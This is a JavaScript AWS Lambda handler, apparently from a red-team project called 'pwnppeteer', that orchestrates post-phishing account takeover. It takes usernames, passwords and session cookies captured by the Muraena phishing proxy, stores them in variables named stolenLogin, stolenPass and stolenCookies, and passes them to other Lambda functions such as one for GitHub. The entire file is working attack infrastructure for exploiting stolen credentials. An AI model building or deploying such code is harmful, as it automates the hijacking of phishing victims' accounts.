const AWS = require("aws-sdk");

module.exports.pwn = (event, context, callback) => {

  var lambda = new AWS.Lambda();

  // a body is expected with all instrumentation value you need
  // https://github.com/muraenateam/muraena/blob/master/config/instrument.necro
  if (event.body == null || JSON.parse(event.body).task.type == undefined ) {
    callback(null, {
      statusCode: 400,
      body: JSON.stringify({ message: "Try hard, you can pwn someone :)"})
    });
  };
  // Access variables from body
  // Parameters send to other lambdas
  const Provider = JSON.parse(event.body).task.type;
  const stolenLogin = JSON.parse(event.body).username;
  const stolenPass = JSON.parse(event.body).password;
  const stolenCookies = JSON.parse(event.body).cookies;

  // Semi Orchestration based on the Task.Type forwarded by Muraena
  try {

    if (Provider === "github") {
      var params = {
        // FunctionName is based on what you defined in serverless.yml
        FunctionName: "lambda-pwnppeteer-dev-PwnGithub",
        InvocationType: "Event",
        Payload : JSON.stringify(JSON.parse(event.body)),
      };
      lambda.invoke(params, function(error, data) {
        console.log(params);
        console.log(`Github Lambda has been called`);
      });
    }; 
    // Just to check lamdba deployment
    if (Provider === "debug") {
      console.log(`message: Debug provider`);
      callback(null, {
        statusCode: 200,
        body: JSON.stringify({
        message : "Debug provider"
        })
      });
    };
    if (Provider === "test") { 
      var params = {
        FunctionName: "lambda-pwnppeteer-dev-PwnSNK",
        //InvocationType: "RequestResponse",
        // Async mode set to "Event" 
        InvocationType: "Event",
      /*
        Payload : JSON.stringify({
          message: 'test lambda executed successfully!',
          login: stolenLogin,
          password: stolenPass,}),
      };
      */
        Payload : JSON.stringify(JSON.parse(event.body)),
      };
      lambda.invoke(params, function(error, data) {
        console.log(`Test lambda executed for ${stolenLogin}`);
        //const response = {
        //statusCode: 200,
        //body: 'proof: ' + JSON.parse(data.Payload)
        //};
        //callback(null, response)
      });
    };
    } catch (error) {
      callback(error);
    } finally {
      console.log("Orchestration done!");
      callback(null, {
        statusCode: 200,
        body: JSON.stringify({
        message : "Orchestration on-going..."
        })
      });

    };
};
